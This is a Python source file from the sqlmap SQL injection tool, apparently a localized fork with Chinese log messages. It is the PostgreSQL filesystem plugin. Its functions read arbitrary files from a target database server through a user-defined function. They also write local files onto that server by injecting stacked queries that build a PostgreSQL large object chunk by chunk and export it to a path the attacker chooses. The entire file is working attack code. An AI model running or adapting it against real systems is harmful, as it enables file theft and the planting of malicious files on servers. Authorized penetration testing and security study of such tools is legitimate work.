#!/usr/bin/env python

"""
Copyright (c) 2006-2024 sqlmap developers (https://sqlmap.org/)
See the file 'LICENSE' for copying permission
"""

import os

from lib.core.common import randomInt
from lib.core.compat import xrange
from lib.core.data import kb
from lib.core.data import logger
from lib.core.exception import SqlmapUnsupportedFeatureException
from lib.core.settings import LOBLKSIZE
from lib.request import inject
from plugins.generic.filesystem import Filesystem as GenericFilesystem

class Filesystem(GenericFilesystem):
    def __init__(self):
        self.oid = None
        self.page = None

        GenericFilesystem.__init__(self)

    def stackedReadFile(self, remoteFile):
        if not kb.bruteMode:
            infoMsg = "获取文件: '%s'" % remoteFile
            logger.info(infoMsg)

        self.initEnv()

        return self.udfEvalCmd(cmd=remoteFile, udfName="sys_fileread")

    def unionWriteFile(self, localFile, remoteFile, fileType=None, forceCheck=False):
        errMsg = "PostgreSQL不支持使用UNION查询SQL注入技术上传文件"
        raise SqlmapUnsupportedFeatureException(errMsg)

    def stackedWriteFile(self, localFile, remoteFile, fileType, forceCheck=False):
        localFileSize = os.path.getsize(localFile)
        content = open(localFile, "rb").read()

        self.oid = randomInt()
        self.page = 0

        self.createSupportTbl(self.fileTblName, self.tblField, "text")

        debugMsg = "为大对象创建一个新的OID,它会隐式地在大对象系统表中添加一个条目"
        logger.debug(debugMsg)

        # 参考:
        # http://www.postgresql.org/docs/8.3/interactive/largeobjects.html
        # http://www.postgresql.org/docs/8.3/interactive/lo-funcs.html

        inject.goStacked("SELECT lo_unlink(%d)" % self.oid)
        inject.goStacked("SELECT lo_create(%d)" % self.oid)
        inject.goStacked("DELETE FROM pg_largeobject WHERE loid=%d" % self.oid)

        for offset in xrange(0, localFileSize, LOBLKSIZE):
            fcEncodedList = self.fileContentEncode(content[offset:offset + LOBLKSIZE], "base64", False)
            sqlQueries = self.fileToSqlQueries(fcEncodedList)

            for sqlQuery in sqlQueries:
                inject.goStacked(sqlQuery)

            inject.goStacked("INSERT INTO pg_largeobject VALUES (%d, %d, DECODE((SELECT %s FROM %s), 'base64'))" % (self.oid, self.page, self.tblField, self.fileTblName))
            inject.goStacked("DELETE FROM %s" % self.fileTblName)

            self.page += 1

        debugMsg = "将OID %s 文件内容导出到文件 '%s'" % (fileType, remoteFile)
        logger.debug(debugMsg)

        inject.goStacked("SELECT lo_export(%d, '%s')" % (self.oid, remoteFile), silent=True)

        written = self.askCheckWrittenFile(localFile, remoteFile, forceCheck)

        inject.goStacked("SELECT lo_unlink(%d)" % self.oid)

        return written
